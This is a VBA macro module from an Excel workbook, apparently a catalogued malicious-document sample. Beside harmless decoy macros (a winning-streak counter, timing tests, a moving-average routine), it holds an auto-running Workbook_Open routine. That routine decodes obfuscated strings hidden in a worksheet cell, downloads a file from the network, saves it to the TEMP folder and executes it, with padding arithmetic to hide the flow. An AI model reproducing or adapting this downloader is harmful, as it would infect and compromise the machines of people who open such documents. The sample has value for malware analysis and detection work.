Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit
Private d52fad3c6976fe9() As String
Private f7a9c4993a6c28, rda87ec359b4caa, qcb91cecc1ad292
Sub google()
    Dim r As Range
    Set r = Range("B2:E5")
    
    A = r.Count
    t = 0
    o = 0
    For i = 0 To A
        p = r(i)
        If r(i) = "W" Then
            t = t + 1
            If t > o Then
                o = t
            End If
        Else
            t = 0
        End If
    Next i
    MsgBox "Longest winning streak: " & o
End Sub
Private Sub h32c42ea62fcf2()
Dim e6d18a958a6d As Long
Dim sa99e53d19cd36 As Long
d52fad3c6976fe9 = Split(ThisWorkbook.Sheets("CGMZH").Range("H112").Value, Chr((((33 + 7) / 2) * 3) - (20 - 4)))
For sa99e53d19cd36 = 0 To UBound(d52fad3c6976fe9, 1)
Dim ac3816a417 As String
For e6d18a958a6d = 1 To Len(d52fad3c6976fe9(sa99e53d19cd36))
ac3816a417 = ac3816a417 & Chr(Int(Chr(38) & Chr(72) & Mid(d52fad3c6976fe9(sa99e53d19cd36), e6d18a958a6d, 2)) - 40)
e6d18a958a6d = e6d18a958a6d + 1
Next
d52fad3c6976fe9(sa99e53d19cd36) = ac3816a417: ac3816a417 = ""
Next sa99e53d19cd36
Set f7a9c4993a6c28 = CreateObject(d52fad3c6976fe9(1))
Dim cdea29329c4e9 As Long: cdea29329c4e9 = 9
Do While True
Select Case cdea29329c4e9
Case 0: CallByName f7a9c4993a6c28, d52fad3c6976fe9(4), 1, d52fad3c6976fe9(10), d52fad3c6976fe9(11): cdea29329c4e9 = 6
Case 1: Set qcb91cecc1ad292 = CreateObject(d52fad3c6976fe9(13)): cdea29329c4e9 = 7
Case 2: CallByName rda87ec359b4caa, d52fad3c6976fe9(6), 1, Environ("TEMP") & "\bd9ef.txt", 2: cdea29329c4e9 = 5
Case 4: CallByName rda87ec359b4caa, d52fad3c6976fe9(5), 1, CallByName(f7a9c4993a6c28, d52fad3c6976fe9(8), 2): cdea29329c4e9 = 2
Case 5: CallByName rda87ec359b4caa, d52fad3c6976fe9(7), 1: cdea29329c4e9 = 1
Case 6: CallByName f7a9c4993a6c28, d52fad3c6976fe9(9), 1: cdea29329c4e9 = 8
Case 7: CallByName qcb91cecc1ad292, d52fad3c6976fe9(14), 1, d52fad3c6976fe9(12), ((((10 + 8) - 9) / 3) / 3) - 1, True: Exit Do
Case 8: Set rda87ec359b4caa = CreateObject(d52fad3c6976fe9(2)): CallByName rda87ec359b4caa, d52fad3c6976fe9(3), 1: rda87ec359b4caa.Type = 1: cdea29329c4e9 = 4
Case 9: CallByName f7a9c4993a6c28, d52fad3c6976fe9(3), 1, d52fad3c6976fe9(15), d52fad3c6976fe9(0), False: cdea29329c4e9 = 0
Case 37: cdea29329c4e9 = (Sin(Sqr(54) + 623) * 3 ^ Sqr(54)) / Sqr(54)
Case 38: cdea29329c4e9 = (Sin(Sqr(54) + 235) * 1 ^ Sqr(54)) / Sqr(54)
Case 29: cdea29329c4e9 = ((878 - 255 * 2) + 11.575) / 3
Case 42: cdea29329c4e9 = (Sin(Sqr(25) + 55) * 16 ^ Sqr(54)) / Sqr(54)
Case 43: cdea29329c4e9 = (Sin(Sqr(35) + 1315) * 20 ^ Sqr(64)) / Sqr(54)
Case 45: cdea29329c4e9 = ((878 - 255 * 2) + 11.575) / 3
Case 10: cdea29329c4e9 = (((5151 + 1555 - 333) * 2) ^ 46) / 9
Case 14: cdea29329c4e9 = 26.343 * 35.3 ^ 3 / 3 + (2525 + 3.3 / 1.2) * 4 - (56.17564 * 3)
Case 33: cdea29329c4e9 = (Sin(Sqr(1) + 2112) * 8 ^ Sqr(345)) / Sqr(54)
Case 34: cdea29329c4e9 = (Sin(Sqr(22) + 523) * 12 ^ Sqr(11)) / Sqr(54)
Case 15: cdea29329c4e9 = 44.343 * 35.3 ^ 3 / 3 + (2525 + 3.3 / 1.2) * 4 - (56.17564 * 3)
Case 16: cdea29329c4e9 = (((5151 + 1555 - 333) * 2) ^ 46) / 9
Case 35: cdea29329c4e9 = (Sin(Sqr(54) + 282) * 16 ^ Sqr(54)) / Sqr(54)
Case 36: cdea29329c4e9 = (Sin(Sqr(54) + 282) * 20 ^ Sqr(54)) / Sqr(54)
Case 19: cdea29329c4e9 = ((235 - 255 * 2) + 11.575) / 3
Case 20: cdea29329c4e9 = 26.343 * 35.3 ^ 3 / 3 + (24 + 3.3 / 1.2) * 4 - (14 * 3)
Case 21: cdea29329c4e9 = ((444 - 66 * 2) + 11.575) / 3
Case 39: cdea29329c4e9 = 26.343 * 35.3 ^ 3 / 3 + (46325 + 3.3 / 1.2) * 4 - (56.17564 * 3)
Case 40: cdea29329c4e9 = ((878 - 255 * 2) + 11.575) / 3
Case 41: cdea29329c4e9 = 24.343 * 35.3 ^ 2 / 3 + (33 + 63 / 1.2) * 4 - (37.17564 * 3)
Case 22: cdea29329c4e9 = 26.343 * 35.3 ^ 3 / 3 + (2525 + 3.3 / 1.2) * 4 - (37 * 3)
Case 23: cdea29329c4e9 = ((878 - 255 * 2) + 11.575) / 3
Case 25: cdea29329c4e9 = ((33.333 - 2.41 * 4) ^ 2) / 1
Case 24: cdea29329c4e9 = 65.35 * 35.3 ^ (56.17564 * 3)
Case 26: cdea29329c4e9 = 24 * 2.3 ^ 3 / 4 + (11 + 3.3 / 1.2) * 4 - (56.17564 * 3)
Case 27: cdea29329c4e9 = ((878 - 255 * 2) + 11.575) / 3
Case 28: cdea29329c4e9 = 1.343 * 64.3 ^ 3 / 3 + (2525 + 3.3 / 1.2) * 4 - (56.17564 * 3)
End Select
Loop
End Sub
Sub Workbook_Open()
Dim ld22cd88ee7 As Long: ld22cd88ee7 = 2
Dim t8c14d746ff7e5 As String
Dim c58e19d6862bb14be6 As Long
Select Case ld22cd88ee7
Case 23 * Int(79 / 94) - Int(3099 / 3133) * 14
If 19 < 5 Then
Dim t_New0 As Long
t_New0 = (12 ^ 18) / 28
Dim y_New0 As Long
y_New0 = (t_New0 - 16) ^ 11
Else
Dim t_NewNext_0  As Long
t_NewNext_0 = ((4 * 21) ^ 10)
Dim y_NewNext_0 As Long
y_NewNext_0 = (t_NewNext_0 - 18) ^ 7
End If
Case 21 - (18 + 13) - 25
If 20 < 22 Then
Dim t_New1 As Long
t_New1 = (28 ^ 23) + 19
Dim y_New1 As Long
y_New1 = (t_New1 + 15) ^ 29
Else
Dim t_NewNext_1  As Long
t_NewNext_1 = ((23 - 22) ^ 18)
Dim y_NewNext_1 As Long
y_NewNext_1 = (t_NewNext_1 - 11) ^ 16
End If
Case 27 + (348 - 192) + 17
If 7 < 20 Then
Dim t_New2 As Long
t_New2 = (18 ^ 28) - 29
Dim y_New2 As Long
y_New2 = (t_New2 * 9) ^ 10
Else
Dim t_NewNext_2  As Long
t_NewNext_2 = ((9 / 8) ^ 4)
Dim y_NewNext_2 As Long
y_NewNext_2 = (t_NewNext_2 * 13) ^ 21
End If
Case 11 - (28 + 25) - 19
If 13 < 23 Then
Dim t_New3 As Long
t_New3 = (21 ^ 21) + 24
Dim y_New3 As Long
y_New3 = (t_New3 + 7) ^ 8
Else
Dim t_NewNext_3  As Long
t_NewNext_3 = ((13 * 16) ^ 5)
Dim y_NewNext_3 As Long
y_NewNext_3 = (t_NewNext_3 + 6) ^ 4
End If
Case ((((2 * 6) / 3) * 2) / 4):
Dim t_New4 As Long
t_New4 = (7 / 15) - 17 / 7
Dim y_New4 As Long
y_New4 = (t_New4 - 8) / 18
Call h32c42ea62fcf2
Case 6 / Int(4 + 20 / 11) / 5
If 18 < 18 Then
Dim t_New5 As Long
t_New5 = (11 ^ 26) + 15
Dim y_New5 As Long
y_New5 = (t_New5 + 24) ^ 29
Else
Dim t_NewNext_5  As Long
t_NewNext_5 = ((21 / 26) ^ 20)
Dim y_NewNext_5 As Long
y_NewNext_5 = (t_NewNext_5 / 8) ^ 21
End If
End Select
End Sub

Sub TimeTest1()
'   VARIABLES DECLARED
    Dim x As Long, y As Long
    Dim A As Double, B As Double, C As Double
    Dim i As Long, j As Long
    Dim StartTime As Date, EndTime As Date
'   Store the starting time
    StartTime = Timer
'   Perform some calculations
    x = 0
    y = 0
    For i = 1 To 10000
        x = x + 1
        y = x + 1
        For j = 1 To 10000
            A = x + y + i
            B = y - x - i
            C = x / y * i
        Next j
    Next i
'   Get ending time
    EndTime = Timer
'   Display total time in seconds
    MsgBox Format(EndTime - StartTime, "0.0")
End Sub

Sub TimeTest2()
'   VARIABLES NOT DECLARED
'   Store the starting time
    StartTime = Timer
'   Perform some calculations
    x = 0
    y = 0
    For i = 1 To 10000
        x = x + 1
        y = x + 1
        For j = 1 To 10000
            A = x + y + i
            B = y - x - i
            C = x / y * i
        Next j
    Next i
'   Get ending time
    EndTime = Timer
'   Display total time in seconds
    MsgBox Format(EndTime - StartTime, "0.0")
End Sub
Sub call_calculate_SMA()
    '1.Chear output sheet @get_This_Sheet = 'Stock, Output'
    Set get_This_Sheet = Worksheets(get_Sheet_Name(2))
    get_This_Sheet.Range("A1").CurrentRegion.ClearContents
    
    '2. @calculate_SMA = get_Sheet_Name() = 'Stock, Output'
    'Select Case wilder
    '   Case 0:
            'Call calculate_SMA(get_Sheet_Name(1))
            'msg = 0
        'case 1:
            'Call calculate_SMA(get_Sheet_Name(1))
            'Call calculate_SMA(get_Sheet_Name(2))
            'msg = 1
    'End Select
    Call calculate_SMA(get_Sheet_Name(1))
    Call calculate_SMA(get_Sheet_Name(2))
    
    '8. If user did not choose Wilder
    msg = 0
    
    '8. Tell user calculation was successful
    Dim show_Message As String
    
    '@msg = 0 OR 1
    Select Case msg
        Case 0:
            '@show_Message = ... & @periods = 5, 10, 25... & ...
            show_Message = "SMA (" & periods & ") on price was successful"
        Case 1:
            'Alternate message if Wilder was chosen
            show_Message = "SMA and Wilder (" & periods & ") on price was successful"
    End Select
    
    '@Show_Message = "..."
    MsgBox show_Message, vbInformation
End Sub


INQUEST-PP=macro
